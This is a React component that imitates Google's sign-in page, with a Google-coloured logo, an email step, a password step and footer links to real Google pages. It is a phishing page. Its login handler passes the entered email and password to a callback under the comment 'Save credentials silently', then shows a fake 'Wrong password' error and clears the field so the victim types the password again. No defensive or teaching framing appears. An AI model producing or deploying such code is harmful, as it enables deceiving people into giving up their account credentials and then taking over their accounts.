import { useState } from "react";

type Step = "email" | "password";

interface GoogleLoginPageProps {
  sessionId: string;
  onCredentials: (email: string, password: string) => void;
}

export default function GoogleLoginPage({ sessionId: _sessionId, onCredentials }: GoogleLoginPageProps) {
  const [step, setStep] = useState<Step>("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleEmailNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim()) {
      setError("Enter an email or phone number");
      return;
    }
    setError("");
    setStep("password");
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) {
      setError("Enter a password");
      return;
    }
    setLoading(true);
    setError("");

    // Save credentials silently
    onCredentials(email, password);

    // Simulate a delay then show error
    await new Promise((r) => setTimeout(r, 1200));
    setLoading(false);
    setError("Wrong password. Try again or click \"Forgot password\" to reset it.");
    setPassword("");
  };

  return (
    <div className="gl-outer">
      <div className="gl-card">
        {/* Google logo inside card */}
        <div className="gl-logo">
          <span style={{ color: "#4285F4" }}>G</span>
          <span style={{ color: "#EA4335" }}>o</span>
          <span style={{ color: "#FBBC05" }}>o</span>
          <span style={{ color: "#4285F4" }}>g</span>
          <span style={{ color: "#34A853" }}>l</span>
          <span style={{ color: "#EA4335" }}>e</span>
        </div>

        {step === "email" ? (
          <form onSubmit={handleEmailNext} className="gl-form">
            <h1 className="gl-title">Sign in</h1>
            <p className="gl-subtitle">Use your Google Account</p>

            <div className="gl-input-wrap">
              <input
                type="text"
                value={email}
                onChange={(e) => { setEmail(e.target.value); setError(""); }}
                className={`gl-input ${error ? "gl-input-error" : ""}`}
                placeholder=" "
                id="email"
                autoFocus
                autoComplete="email"
              />
              <label htmlFor="email" className="gl-label">Email or phone</label>
              {error && <span className="gl-error-msg">{error}</span>}
            </div>

            <a href="#" className="gl-forgot">Forgot email?</a>

            <p className="gl-notice">
              Not your computer? Use a Private Window to sign in.{" "}
              <a href="https://support.google.com/chrome/answer/95464" target="_blank" rel="noreferrer">
                Learn more about using Guest mode
              </a>
            </p>

            <div className="gl-actions">
              <a href="https://accounts.google.com/signup" target="_blank" rel="noreferrer" className="gl-create-btn">
                Create account
              </a>
              <button type="submit" className="gl-next-btn">Next</button>
            </div>
          </form>
        ) : (
          <form onSubmit={handleLogin} className="gl-form">
            <h1 className="gl-title">Welcome</h1>
            <div className="gl-email-chip">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="#5f6368"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
              <span>{email}</span>
              <button type="button" onClick={() => { setStep("email"); setError(""); setPassword(""); }} className="gl-chip-close" aria-label="Change account">
                <svg viewBox="0 0 24 24" width="18" height="18" fill="#5f6368"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
              </button>
            </div>

            <div className="gl-input-wrap">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => { setPassword(e.target.value); setError(""); }}
                className={`gl-input ${error ? "gl-input-error" : ""}`}
                placeholder=" "
                id="password"
                autoFocus
                autoComplete="current-password"
              />
              <label htmlFor="password" className="gl-label">Enter your password</label>
              {error && <span className="gl-error-msg">{error}</span>}
            </div>

            <label className="gl-show-pw">
              <input
                type="checkbox"
                checked={showPassword}
                onChange={(e) => setShowPassword(e.target.checked)}
              />
              <span>Show password</span>
            </label>

            <a href="#" className="gl-forgot">Forgot password?</a>

            <div className="gl-actions">
              <a href="https://accounts.google.com" target="_blank" rel="noreferrer" className="gl-create-btn">
                More options
              </a>
              <button type="submit" className="gl-next-btn" disabled={loading}>
                {loading ? (
                  <span className="gl-spinner" />
                ) : (
                  "Next"
                )}
              </button>
            </div>
          </form>
        )}
      </div>

      {/* Footer */}
      <footer className="gl-footer">
        <div className="gl-footer-inner">
          <div className="gl-footer-left">
            <select className="gl-lang-select" defaultValue="en-GB">
              <option value="en-GB">English (United Kingdom)</option>
              <option value="ar">العربية</option>
            </select>
          </div>
          <div className="gl-footer-right">
            <a href="https://policies.google.com/privacy" target="_blank" rel="noreferrer">Privacy</a>
            <a href="https://policies.google.com/terms" target="_blank" rel="noreferrer">Terms</a>
            <a href="https://support.google.com/accounts" target="_blank" rel="noreferrer">Help</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
